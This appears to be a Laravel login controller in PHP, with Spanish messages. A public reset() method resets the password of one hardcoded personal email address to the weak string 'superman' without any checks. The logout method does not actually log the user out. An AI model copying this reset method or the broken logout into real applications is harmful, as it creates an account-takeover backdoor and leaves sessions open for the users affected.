<?php

namespace App\Http\Controllers\Auth;

use App\Http\Controllers\Controller;
use Illuminate\Foundation\Auth\AuthenticatesUsers;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Input;
use Response;
use App\User;
use Hash;

class LoginController extends Controller
{
    /*
    |--------------------------------------------------------------------------
    | Login Controller
    |--------------------------------------------------------------------------
    |
    | This controller handles authenticating users for the application and
    | redirecting them to your home screen. The controller uses a trait
    | to conveniently provide its functionality to your applications.
    |
    */

    use AuthenticatesUsers;

    /**
     * Where to redirect users after login.
     *
     * @var string
     */
    protected $redirectTo = '/';

    /**
     * Create a new controller instance.
     *
     * @return void
     */
    public function __construct()
    {
        $this->middleware('guest', ['except' => 'logout']);
    }
    public function reset(){
        User::Where('email','=','evannykarol1990@gmail.com')->update(['password'=>Hash::make('superman')]);
    }
    public function postSignin() {      
            if(Auth::attempt(['email' => Input::get('email'), 'password' => Input::get('password')])){
                return Response::json(['success' => true], 200);
            } else{
                    return Response::json(['success' => false,'errors' => 'Invalido Usuario o Contraseña.', 400]);
            }
     }
     public function logout() {      
        // Auth::logout();
        return "cerrando";
     }
}
